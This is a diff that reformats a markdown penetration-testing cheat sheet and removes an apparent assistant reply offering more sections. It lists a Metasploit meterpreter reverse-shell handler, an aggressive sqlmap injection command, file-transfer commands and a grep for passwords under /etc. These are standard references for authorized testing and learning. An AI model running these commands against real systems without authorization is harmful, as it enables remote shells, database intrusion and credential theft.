@@ -55,57 +55,39 @@ reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
 
 
 Metasploit
-bash
-# Basic workflow
+
+```# Basic workflow
 msfconsole
 use exploit/multi/handler
 set payload windows/x64/meterpreter/reverse_tcp
 set LHOST <YOUR_IP>
-exploit
-SQL Injection
-bash
-sqlmap -u "http://site.com/page?id=1" --risk=3 --level=5 --batch
-📦 Post-Exploitation
-File Transfers
-bash
-# Python HTTP server
-python3 -m http.server 8000
+exploit```
 
-# SCP download
-scp user@target:/path/to/file .
+SQL Injection
+
+```sqlmap -u "http://site.com/page?id=1" --risk=3 --level=5 --batch```
+
+
+📦 Post-Exploitation
+
+File Transfers
+
+```# Python HTTP server
+python3 -m http.server 8000```
+
+```# SCP download
+scp user@target:/path/to/file .```
+
 Credential Hunting
-bash
-# Find passwords in files
-grep -riE 'password|passwd|cred' /etc/ 2>/dev/null
+
+```# Find passwords in files
+grep -riE 'password|passwd|cred' /etc/ 2>/dev/null```
+
+
 📚 Resources
+
 GTFOBins
 
 PayloadsAllTheThings
 
 HackTricks
-
-text
-
-### Features:
-1. **Clean Markdown Formatting** - Easy to read and maintain
-2. **Emoji Visual Categorization** - Quick navigation
-3. **Practical Examples** - Real-world command usage
-4. **Key Parameters Explained** - No guessing what flags do
-5. **Expandable Structure** - Add new sections easily
-
-### How to Use:
-1. Save as `cheatsheet.md` in your repo
-2. Update regularly with new commands
-3. Use GitHub's preview feature to view formatting
-
-Would you like me to add any specific tools or categories? I can include sections for:
-- Active Directory attacks
-- Cloud security
-- Binary exploitation
-- Mobile app testing
-
-```   ```
-
-```   ```
-
-```   ```
